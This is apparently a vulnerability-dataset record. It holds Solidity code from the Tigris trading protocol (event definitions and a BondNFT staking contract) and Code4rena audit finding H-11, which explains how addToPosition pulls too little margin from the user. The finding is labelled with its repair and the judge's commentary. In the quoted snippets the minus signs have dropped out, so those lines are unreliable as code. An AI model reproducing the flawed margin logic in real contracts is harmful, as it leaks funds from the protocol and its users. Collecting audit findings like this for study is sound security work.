   */\n    function setTradingExtension(\n        address _ext\n    ) external onlyOwner() {\n        tradingExtension = ITradingExtension(_ext);\n    }\n\n    // ===== EVENTS =====\n\n    event PositionOpened(\n        TradeInfo _tradeInfo,\n        uint _orderType,\n        uint _price,\n        uint _id,\n        address _trader,\n        uint _marginAfterFees\n    );\n\n    event PositionClosed(\n        uint _id,\n        uint _closePrice,\n        uint _percent,\n        uint _payout,\n        address _trader,\n        address _executor\n    );\n\n    event PositionLiquidated(\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event LimitOrderExecuted(\n        uint _asset,\n        bool _direction,\n        uint _openPrice,\n        uint _lev,\n        uint _margin,\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event UpdateTPSL(\n        uint _id,\n        bool _isTp,\n        uint _price,\n        address _trader\n    );\n\n    event LimitCancelled(\n        uint _id,\n        address _trader\n    );\n\n    event MarginModified(\n        uint _id,\n        uint _newMargin,\n        uint _newLeverage,\n        bool _isMarginAdded,\n        address _trader\n    );\n\n    event AddToPosition(\n        uint _id,\n        uint _newMargin,\n        uint _newPrice,\n        address _trader\n    );\n\n    event FeesDistributed(\n        address _tigAsset,\n        uint _daoFees,\n        uint _burnFees,\n        uint _refFees,\n        uint _botFees,\n        address _referrer\n    );\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract BondNFT is ERC721Enumerable, Ownable {\n    \n    uint constant private DAY = 24 * 60 * 60;\n\n    struct Bond {\n        uint id;\n        address owner;\n        address asset;\n        uint amount;\n        uint mintEpoch;\n        uint mintTime;\n        uint expireEpoch;\n        uint pending;\n        uint shares;\n        uint period;\n        bool expired;\n    }\n\n    mapping(address => uint256) public epoch;\n    uint private totalBonds;\n    string public baseURI;\n    address public manager;\n    address[] public assets;\n\n    mapping(address => bool) public allowedAsset;\n    mapping(address => uint) private assetsIndex;\n    mapping(uint256 => mapping(address => uint256)) private bondPaid;\n    mapping(address => mapping(uint256 => uint256)) private accRewardsPerShare; // tigAsset => epoch => accRewardsPerShare\n    mapping(uint => Bond) private _idToBond;\n    mapping(address => uint) public totalShares;\n    mapping(address => mapping(address => uint)) public userDebt; // user => tigAsset => amount\n\n    constructor(\n        string memory _setBaseURI,\n        string memory _name,\n        string memory _symbol\n    ) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n    }\n\n    /**\n     * @notice Create a bond\n     * @dev Should only be called by a manager contract\n     * @param _asset tigAsset token to lock\n     * @param _amount tigAsset amount\n     * @param _period time to lock for in days\n     * @param _owner address to receive the bond\n     * @return id ID of the minted bond\n     */\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, _owner, id);\n    }\n\n    /** \n     * @notice Extend the lock period and/or amount of a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _asset tigAsset token address\n     * @param _amount amount of tigAsset being added\n     * @param _period days being added to the bond\n     * @param _sender address extending the bond\n     */\n    function extendLock(\n        uint _id,\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _sender\n    ) external onlyManager() {\n        Bond memory bond = idToBond(_id);\n        Bond storage _bond = _idToBond[_id];\n        require(bond.owner == _sender, \"!owner\");\n        require(!bond.expired, \"Expired\");\n        require(bond.asset == _asset, \"!BondAsset\");\n        require(bond.pending == 0);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(bond.period+_period <= 365, \"MAX PERIOD\");\n        unchecked {\n            uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n            uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n            totalShares[bond.asset] += shares-bond.shares;\n            _bond.shares = shares;\n            _bond.amount += _amount;\n            _bond.expireEpoch = expireEpoch;\n            _bond.period += _period;\n            _bond.mintTime = block.timestamp;\n            _bond.mintEpoch = epoch[bond.asset];\n            bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n        }\n        emit ExtendLock(_period, _amount, _sender,  _id);\n    }\n\n    /**\n     * @notice Release a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _releaser address initiating the release of the bond\n     * @return amount amount of tigAsset returned\n     * @return lockAmount amount of tigAsset locked in the bond\n     * @return asset tigAsset token released\n     * @return _owner bond owner\n     */\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n            (uint256 _claimAmount,) = claim(_id, bond.owner);\n            amount += _claimAmount;\n        }\n        asset = bond.asset;\n        lockAmount = bond.amount;\n        _owner = bond.owner;\n        _burn(_id);\n        emit Release(asset, lockAmount, _owner, _id);\n    }\n    /**\n     * @notice Claim rewards from a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond to claim rewards from\n     * @param _claimer address claiming rewards\n     * @return amount amount of tigAsset claimed\n     * @return tigAsset tigAsset token address\n     */\n    function claim(\n        uint _id,\n        address _claimer\n    ) public onlyManager() returns(uint amount, address tigAsset) {\n        Bond memory bond = idToBond(_id);\n        require(_claimer == bond.owner, \"!owner\");\n        amount = bond.pending;\n        tigAsset = bond.asset;\n        unchecked {\n            if (bond.expired) {\n                uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n                if (totalShares[bond.asset] > 0) {\n                    accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n                }\n            }\n            bondPaid[_id][bond.asset] += amount;\n        }\n        IERC20(tigAsset).transfer(manager, amount);\n        emit ClaimFees(tigAsset, amount, _claimer, _id);\n    }\n\n    /**\n     * @notice Claim user debt left from bond transfer\n     * @dev Should only be called by a manager contract\n     * @param _user user address\n     * @param _tigAsset tigAsset token address\n     * @return amount amount of tigAsset claimed\n     */\n    function claimDebt(\n        address _user,\n        address _tigAsset\n    ) public onlyManager() returns(uint amount) {\n        amount = userDebt[_user][_tigAsset];\n        userDebt[_user][_tigAsset] = 0;\n        IERC20(_tigAsset).transfer(manager, amount);\n        emit ClaimDebt(_tigAsset, amount, _user);\n    }\n\n    /**\n     * @notice Distribute rewards to bonds\n     * @param _tigAsset tigAsset token address\n     * @param _amount tigAsset amount\n     */\n    function distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n\n    /**\n     * @notice Get all data for a bond\n     * @param _id ID of the bond\n     * @return bond Bond object\n     */\n    function idToBond(uint256 _id) public view returns (Bond memory bond) {\n        bond = _idToBond[_id];\n        bond.owner = ownerOf(_id);\n        bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n        unchecked {\n            uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n            bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n        }\n    }\n\n    /*\n     * @notice Get expired boolean for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function isExpired(uint256 _id) public view returns (bool) {\n        Bond memory bond = _idToBond[_id];\n        return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n    }\n\n    /*\n     * @notice Get pending rewards for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function pending(\n        uint256 _id\n    ) public view returns (uint256) {\n        return idToBond(_id).pending;\n    }\n\n    function totalAssets() public view returns (uint256) {\n        return assets.length;\n    }\n\n    /*\n     * @notice Gets an array of all whitelisted token addresses\n     * @return address array of addresses\n     */\n    function getAssets() public view returns (address[] memory) {\n        return assets;\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function safeTransferMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _transfer(_msgSender(), _to, _ids[i]);\n            }\n        }\n    }\n\n    function safeTransferFromMany(address _from, address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                safeTransferFrom(_from, _to, _ids[i]);\n            }\n        }\n    }\n\n    function approveMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                approve(_to, _ids[i]);\n            }\n        }\n    }\n\n    function _mint(\n        address to,\n        Bond memory bond\n    ) internal {\n        unchecked {\n            bondPaid[bond.id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * bond.shares / 1e18;\n        }\n        _mint(to, bond.id);\n    }\n\n    function _burn(\n        uint256 _id\n    ) internal override {\n        delete _idToBond[_id];\n        super._burn(_id);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 _id\n    ) internal override {\n        Bond memory bond = idToBond(_id);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(!bond.expired, \"Expired!\");\n        unchecked {\n            require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n            userDebt[from][bond.asset] += bond.pending;\n            bondPaid[_id][bond.asset] += bond.pending;\n        }\n        super._transfer(from, to, _id);\n    }\n\n    function balanceIds(address _user) public view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _ids[i] = tokenOfOwnerByIndex(_user, i);\n            }\n        }\n        return _ids;\n    }\n\n    function addAsset(address _asset) external onlyOwner {\n        require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n        assetsIndex[_asset] = assets.length;\n        assets.push(_asset);\n        allowedAsset[_asset] = true;\n        epoch[_asset] = block.timestamp/DAY;\n    }\n\n    function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n        require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n        allowedAsset[_asset] = _bool;\n    }\n\n    function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    function setManager(\n        address _manager\n    ) public onlyOwner() {\n        manager = _manager;\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == manager, \"!manager\");\n        _;\n    }\n\n    event Distribution(address _tigAsset, uint256 _amount);\n    event Lock(address _tigAsset, uint256 _amount, uint256 _period, address _owner, uint256 _id);\n    event ExtendLock(uint256 _period, uint256 _amount, address _owner, uint256 _id);\n    event Release(address _tigAsset, uint256 _amount, address _owner, uint256 _id);\n    event ClaimFees(address _tigAsset, uint256 _amount, address _claimer, uint256 _id);\n    event ClaimDebt(address _tigAsset, uint256 _amount, address _owner);\n}\n\n",
        "CodeNames": [
            "PairsContract.sol",
            "Trading.sol",
            "BondNFT.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-11",
                "Location": [
                    "js\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin _fee,\n    _stableVault,\n    _permitData,\n    _trader\n);\n",
                    "js\nuint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n",
                    "js\nuint256 _marginAfterFees = _tradeInfo.margin _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n"
                ],
                "Type": " Not enough margin pulled or burned from user when adding to a position",
                "Description": "*Submitted by minhtrng(https://github.com/code-423n4/2022-12-tigris-findings/issues/659), also found by Aymen0909(https://github.com/code-423n4/2022-12-tigris-findings/issues/644), hansfriese(https://github.com/code-423n4/2022-12-tigris-findings/issues/505), 0Kage(https://github.com/code-423n4/2022-12-tigris-findings/issues/488), Jeiwan(https://github.com/code-423n4/2022-12-tigris-findings/issues/433), bin2chen(https://github.com/code-423n4/2022-12-tigris-findings/issues/325), KingNFT(https://github.com/code-423n4/2022-12-tigris-findings/issues/209), HollaDieWaldfee(https://github.com/code-423n4/2022-12-tigris-findings/issues/194), and rvierdiiev(https://github.com/code-423n4/2022-12-tigris-findings/issues/130)*\n\nWhen adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio of tigAsset.\n\n\nIn Trading.addToPosition the _handleDeposit function is called like this:\n\njs\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin _fee,\n    _stableVault,\n    _permitData,\n    _trader\n);\n\n\nThe third parameter with the value of _addMargin _fee is the amount pulled (or burned in the case of using tigAsset) from the user. The _fee value is calculated as part of the position size like this:\n\njs\nuint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n\n\nThe _handleOpenFees function mints _tigAsset to the referrer, to the msg.sender (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the _addMargin value paid by the user. Hence using _addMargin _fee as the third parameter to _handleDeposit is going to pull or burn less margin than what was accounted for.\n\nAn example for correct usage can be seen in initiateMarketOrder:\n\njs\nuint256 _marginAfterFees = _tradeInfo.margin _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n\n\nHere the third parameter to _handleDeposit is not _marginAfterFees but _tradeInfo.margin which is what the user has input on and is supposed to pay.\n\n",
                "Repair": "\nIn Trading.addToPosition call the _handleDeposit function without subtracting the _fee value:\n\njs\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin,\n    _stableVault,\n    _permitData,\n    _trader\n);\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1374444369)\n\nAlex the Entreprenerd (judge) increased severity to High and commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1387116632):\n  The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.\n \n While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).\n \n For this reason, I believe the finding to be of High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1407828021):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303 \n\n*\n\n \n\n"
            }
        ]
    }
]